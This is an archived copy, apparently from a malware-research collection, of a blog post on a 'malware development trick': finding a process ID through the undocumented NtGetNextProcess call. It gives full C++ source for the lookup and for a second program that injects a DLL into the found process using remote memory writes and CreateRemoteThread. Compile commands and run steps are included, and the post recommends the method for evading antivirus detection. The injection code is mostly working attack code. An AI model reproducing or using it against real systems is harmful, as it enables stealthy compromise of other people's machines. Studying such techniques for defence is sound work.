{
    "id": "df24401c-cc65-4afc-8aa3-cbabd551811c",
    "created_at": "2023-06-15T02:06:02.815041Z",
    "updated_at": "2025-03-27T02:05:24.579293Z",
    "deleted_at": null,
    "sha1_hash": "50f737b41e356cb3d371bb405e0e3d065f04e695",
    "title": "2023-05-26 - Malware development trick - part 30- Find PID via NtGetNextProcess. Simple CPlusPlus example",
    "authors": "",
    "file_creation_date": "2023-06-04T13:51:34Z",
    "file_modification_date": "2023-06-04T13:51:34Z",
    "file_size": 2852546,
    "plain_text": "# Malware development trick - part 30: Find PID via NtGetNextProcess. Simple C++ example.\n\n**[cocomelonc.github.io/malware/2023/05/26/malware-tricks-30.html](https://cocomelonc.github.io/malware/2023/05/26/malware-tricks-30.html)**\n\n### 5 minute read\n\n ﷽\n\n Hello, cybersecurity enthusiasts and white hackers!\n\n\nMay 26, 2023\n\n\n-----\n\n### Today, I just want to focus my research on another malware development trick: enum processes and find PID via NtGetNextProcess. It is a common technique that can be used by malware for AV evasion also.\n\n## what’s the trick?\n\n### We just simply utilize additional undocumented features. NtGetNextProcess is a system call made available by the kernel that retrieves the next process. But what does next mean? If you’re familiar with Windows internals, you know that process objects are linked together in the kernel’s massive linked list. Therefore, this system call takes the handle to a process object and locates the next process in the chain that the current user can access.\n\n## practical example\n\n### Everything is pretty simple:\n\n\n-----\n\n```\nint findMyProc(const char procname) {\n\n int pid = 0;\n\n HANDLE current = NULL;\n\n char procName[MAX_PATH];\n\n // resolve function address\n\n fNtGetNextProcess myNtGetNextProcess = (fNtGetNextProcess)\nGetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"NtGetNextProcess\");\n\n // loop through all processes\n\n while (!myNtGetNextProcess(current, MAXIMUM_ALLOWED, 0, 0, &current)) {\n\n  GetProcessImageFileNameA(current, procName, MAX_PATH);\n\n  if (lstrcmpiA(procname, PathFindFileName((LPCSTR) procName)) == 0) {\n\n   pid = GetProcessId(current);\n\n   break;\n\n  }\n\n }\n\n return pid;\n\n}\n\n### This function scans all running processes in a Windows system and returns the Process ID (PID) of a process that matches the provided name. A while loop is started which continues until myNtGetNextProcess returns a non-zero value, indicating that there are no more processes. The handle of the next process is obtained by myNtGetNextProcess and stored in\ncurrent. For each process, GetProcessImageFileNameA is used to get the image file name\n\n (the executable file of the process) and stores it in procName. If the base name of procName (obtained using PathFindFileName) matches procname (comparison is case-insensitive due to lstrcmpiA), the process ID of current is obtained.\n\n So, full source code is looks like this (hack.cpp):\n\n```\n\n-----\n\n```\n/\n * hack.cpp - find process ID by NtGetNextProcess. C++ implementation\n\n * @cocomelonc\n\n * https://cocomelonc.github.io/malware/2023/05/26/malware-tricks-30.html\n\n*/\n#include <windows.h>\n\n#include <stdio.h>\n\n#include <winternl.h>\n\n#include <psapi.h>\n\n#include <shlwapi.h>\n\n#pragma comment(lib, \"ntdll.lib\")\n\n#pragma comment(lib, \"shlwapi.lib\")\n\ntypedef NTSTATUS (NTAPI * fNtGetNextProcess)(\n\n _In_ HANDLE ProcessHandle,\n\n _In_ ACCESS_MASK DesiredAccess,\n\n _In_ ULONG HandleAttributes,\n\n _In_ ULONG Flags,\n\n _Out_ PHANDLE NewProcessHandle\n\n);\n\nint findMyProc(const char * procname) {\n\n int pid = 0;\n\n HANDLE current = NULL;\n\n char procName[MAX_PATH];\n\n // resolve function address\n\n fNtGetNextProcess myNtGetNextProcess = (fNtGetNextProcess)\nGetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"NtGetNextProcess\");\n\n // loop through all processes\n\n while (!myNtGetNextProcess(current, MAXIMUM_ALLOWED, 0, 0, &current)) {\n\n  GetProcessImageFileNameA(current, procName, MAX_PATH);\n\n  if (lstrcmpiA(procname, PathFindFileName((LPCSTR) procName)) == 0) {\n\n   pid = GetProcessId(current);\n\n   break;\n\n  }\n\n }\n\n return pid;\n\n}\n\nint main(int argc, char* argv[]) {\n\n int pid = 0; // process ID\n\n pid = findMyProc(argv[1]);\n\n printf(\"%s%d\\n\", pid > 0 ? \"process found at pid = \" : \"process not found. pid = \",\npid);\n\n return 0;\n\n}\n\n## demo\n\n```\n\n-----\n\n### Ok, let s go to look this trick in action.\n\n Compile it (hack.cpp):\n```\nx86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -I/usr/share/mingw-w64/include/ -s ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-allconstants -static-libstdc++ -static-libgcc -fpermissive -lpsapi -lshlwapi\n\n Then, just run it at the victim’s machine (Windows 10 22H2 x64 in my case):\n.\\hack.exe <process>\n\n```\n\n-----\n\n### As you can see, it’s worked perfectly, as expected :) =^..^=\n\n## practical example 2. find and inject\n\n### Let’s go to another example with malicious logic. Find process ID by name and inject DLL to it.\n\n Source code is similar to my post. The only difference is the logic of the findMyProc function (hack2.cpp):\n\n\n-----\n\n```\n/\n * hack2.cpp - find process ID\n\n * by NtGetNextProcess and\n\n * DLL inject. C++ implementation\n\n * @cocomelonc\n\n * https://cocomelonc.github.io/malware/2023/05/26/malware-tricks-30.html\n\n*/\n#include <windows.h>\n\n#include <stdio.h>\n\n#include <winternl.h>\n\n#include <psapi.h>\n\n#include <shlwapi.h>\n\n#pragma comment(lib, \"ntdll.lib\")\n\n#pragma comment(lib, \"shlwapi.lib\")\n\nchar evilDLL[] = \"C:\\\\evil.dll\";\n\nunsigned int evilLen = sizeof(evilDLL) + 1;\n\ntypedef NTSTATUS (NTAPI * fNtGetNextProcess)(\n\n _In_ HANDLE ProcessHandle,\n\n _In_ ACCESS_MASK DesiredAccess,\n\n _In_ ULONG HandleAttributes,\n\n _In_ ULONG Flags,\n\n _Out_ PHANDLE NewProcessHandle\n\n);\n\nint findMyProc(const char * procname) {\n\n int pid = 0;\n\n HANDLE current = NULL;\n\n char procName[MAX_PATH];\n\n // resolve function address\n\n fNtGetNextProcess myNtGetNextProcess = (fNtGetNextProcess)\nGetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"NtGetNextProcess\");\n\n // loop through all processes\n\n while (!myNtGetNextProcess(current, MAXIMUM_ALLOWED, 0, 0, &current)) {\n\n  GetProcessImageFileNameA(current, procName, MAX_PATH);\n\n  if (lstrcmpiA(procname, PathFindFileName((LPCSTR) procName)) == 0) {\n\n   pid = GetProcessId(current);\n\n   break;\n\n  }\n\n }\n\n return pid;\n\n}\n\nint main(int argc, char* argv[]) {\n\n int pid = 0; // process ID\n\n HANDLE ph; // process handle\n\n HANDLE rt; // remote thread\n\n```\n\n-----\n\n```\n LPVOID rb; // remote buffer\n\n pid = findMyProc(argv[1]);\n\n printf(\"%s%d\\n\", pid > 0 ? \"process found at pid = \" : \"process not found. pid = \",\npid);\n\n HMODULE hKernel32 = GetModuleHandle(\"kernel32\");\n\n VOID *lb = GetProcAddress(hKernel32, \"LoadLibraryA\");\n\n // open process\n\n ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));\n\n if (ph == NULL) {\n\n  printf(\"OpenProcess failed! exiting...\\n\");\n\n  return -2;\n\n }\n\n // allocate memory buffer for remote process\n\n rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT),\nPAGE_EXECUTE_READWRITE);\n\n // \"copy\" evil DLL between processes\n\n WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);\n\n // our process start new thread\n\n rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);\n\n CloseHandle(ph);\n\n return 0;\n\n}\n\n### As usually, for simplicity I create simple DLL with meow from evil.dll! messagebox (evil.c):\n\n```\n\n-----\n\n```\n/\nevil.cpp\n\nsimple DLL for DLL inject to process\n\nauthor: @cocomelonc\n\nhttps://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html\n\n*/\n\n#include <windows.h>\n\n#pragma comment (lib, \"user32.lib\")\n\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD nReason, LPVOID lpReserved) {\n\n switch (nReason) {\n\n case DLL_PROCESS_ATTACH:\n\n  MessageBox(\n\n   NULL,\n\n   \"Meow from evil.dll!\",\n\n   \"=^..^=\",\n\n   MB_OK\n\n  );\n\n  break;\n\n case DLL_PROCESS_DETACH:\n\n  break;\n\n case DLL_THREAD_ATTACH:\n\n  break;\n\n case DLL_THREAD_DETACH:\n\n  break;\n\n }\n\n return TRUE;\n\n}\n\n## demo 2\n\n### Ok, let’s go to demonstration our injection.\n\n Compile it:\nx86_64-w64-mingw32-g++ -O2 hack2.cpp -o hack2.exe -I/usr/share/mingw-w64/include/ -s\n-ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-allconstants -static-libstdc++ -static-libgcc -fpermissive -lpsapi -lshlwapi\n\n```\n\n-----\n\n### And run for find and inject to mspaint.exe:\n```\n.\\hack2.exe mspaint.exe\n\n```\n\n-----\n\n### As you can see, our messagebox is injected to mspaint.exe with PID = 2568 as expected. Perfect! =^..^=\n\n As I wrote earlier, this trick can be used to bypass some cyber security solutions, since many systems only detect functions known to many like CreateToolhelp32Snapshot,\n```\nProcess32First, Process32Next. For the same reason, this can be difficult for many\n\n malware analysts.\n\n I haven’t seen this trick in the real-life malware and APT attacks yet. I hope this post spreads awareness to the blue teamers of this interesting malware dev technique, and adds a weapon to the red teamers arsenal.\n\n```\n\n-----\n\n### Find PID by name and inject to it. Classic implementation. Classic DLL injection into the process. Simple C++ malware Taking a Snapchot and Viewing Processes source code in github\n\n This is a practical case for educational purposes only.\n\n Thanks for your time happy hacking and good bye! PS. All drawings and screenshots are mine\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-05-26 - Malware development trick - part 30- Find PID via NtGetNextProcess. Simple CPlusPlus example.pdf"
    ],
    "report_names": [
        "2023-05-26 - Malware development trick - part 30- Find PID via NtGetNextProcess. Simple CPlusPlus example.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1686794762,
    "ts_updated_at": 1743041124,
    "ts_creation_date": 1685886694,
    "ts_modification_date": 1685886694,
    "files": {
        "pdf": "https://archive.orkl.eu/50f737b41e356cb3d371bb405e0e3d065f04e695.pdf",
        "text": "https://archive.orkl.eu/50f737b41e356cb3d371bb405e0e3d065f04e695.txt",
        "img": "https://archive.orkl.eu/50f737b41e356cb3d371bb405e0e3d065f04e695.jpg"
    }
}